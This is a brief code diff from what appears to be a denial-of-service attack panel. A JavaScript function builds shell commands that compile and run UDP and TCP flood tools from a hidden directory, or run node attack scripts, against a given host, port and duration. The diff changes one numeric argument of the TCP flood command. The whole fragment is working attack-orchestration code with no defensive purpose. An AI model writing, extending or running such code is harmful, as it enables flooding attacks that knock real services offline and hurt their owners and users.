@@ -60,7 +60,7 @@ const generateCommand = (method, host, port, time) => {
         case 'UDP1':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
         case 'TCP1':
-            return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port} 20 ${time}`;
+            return `cd /root/.trash && gcc tcp.c -o tcp && ./tcp ${host} ${port} 3 ${time}`;
         default:
             return `cd /root/methods && node ${methods[method]} ${host} ${time}`;
     }
